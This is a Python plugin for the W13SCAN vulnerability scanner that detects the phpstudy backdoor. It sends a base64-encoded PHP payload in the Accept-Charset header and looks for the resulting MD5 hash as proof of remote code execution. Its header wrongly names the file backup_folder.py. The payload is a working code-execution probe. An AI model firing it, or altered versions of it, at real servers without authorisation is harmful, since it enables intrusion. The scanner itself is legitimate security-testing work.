#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/12 5:19 PM
# @Author  : w8ay
# @File    : backup_folder.py
# refer:https://www.t00ls.net/viewthread.php?tid=47698&highlight=%E5%A4%87%E4%BB%BD
# refer:https://www.t00ls.net/viewthread.php?tid=45430&highlight=%E5%A4%87%E4%BB%BD

import os
import re
import copy
import requests

from lib.core.common import generateResponse
from lib.core.enums import VulType, PLACE
from lib.core.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'phpstudy 后门'
    desc = '''phpstudy 后门检测'''

    def audit(self):
        if self.requests.method != "GET":
            return
        request_headers = self.requests.headers
        request_headers_forpayload = copy.deepcopy(request_headers)
        request_headers_forpayload["Accept-Encoding"] = "gzip,deflate"
        request_headers_forpayload["Accept-Charset"] = "cHJpbnRmKG1kNSgzMzMpKTs="
        response = requests.get(self.requests.url, headers=request_headers_forpayload)
        if b"310dcbbf4cce62f762a2aaa148d556bd" in response.content:
                result = self.new_result()
                result.init_info(self.requests.url, "phpstudy后门", VulType.RCE)
                result.add_detail("payload请求", "", "",
                                  "phpstudy 后门", "", "", PLACE.GET)
                self.success(result)
